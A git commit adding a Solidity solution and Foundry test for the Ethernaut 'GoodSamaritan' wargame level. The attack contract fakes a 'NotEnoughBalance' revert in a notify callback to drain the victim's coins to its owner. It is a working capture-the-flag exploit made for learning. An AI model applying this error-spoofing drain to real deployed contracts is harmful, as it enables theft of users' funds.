79cbc7106c654e86df23a788f476b9e67d017d2f
alex liao <alex640702070829@gmail.com>
2023-08-11 18:06:07 +0800

    :white_check_mark: Add level 27 GoodSamaritan solution

---
+++ src/levels/27-GoodSamaritan/AttackGoodSamaritan.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+import "./GoodSamaritan.sol";
+
+contract AttackGoodSamaritan is INotifyable {
+    GoodSamaritan immutable victim;
+    address owner;
+    error NotEnoughBalance();
+
+    constructor(GoodSamaritan _victim) {
+        victim = _victim;
+        owner = msg.sender;
+    }
+
+    function notify(uint256 amount) external pure { 
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+
+    function attack() external {
+        victim.requestDonation();
+
+        uint256 amount = victim.coin().balances(address(this));
+        victim.coin().transfer(owner, amount);
+    }
+}
---
+++ test/27-GoodSamaritan.t.sol
@@ -0,0 +1,47 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "ds-test/test.sol";
+import "forge-std/Vm.sol";
+
+import "src/core/Ethernaut.sol";
+import "src/levels/27-GoodSamaritan/GoodSamaritanFactory.sol";
+import "src/levels/27-GoodSamaritan/AttackGoodSamaritan.sol";
+
+contract GoodSamaritanTest is DSTest {
+    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
+    Ethernaut ethernaut;
+    address hacker = vm.addr(1);
+
+    function setUp() public {
+        ethernaut = new Ethernaut();
+    }
+
+    function testGoodSamaritanHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+        GoodSamaritanFactory goodSamaritanFactory = new GoodSamaritanFactory();
+        ethernaut.registerLevel(goodSamaritanFactory);
+        vm.startPrank(hacker);
+        address levelAddress = ethernaut.createLevelInstance(goodSamaritanFactory);
+        GoodSamaritan ethernautGoodSamaritan = GoodSamaritan(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        emit log_named_uint("hacker's balance before exploit", ethernautGoodSamaritan.coin().balances(hacker));
+        AttackGoodSamaritan attacker = new AttackGoodSamaritan(ethernautGoodSamaritan);
+        attacker.attack();
+        emit log_named_uint("hacker's balance after exploit", ethernautGoodSamaritan.coin().balances(address(hacker)));
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
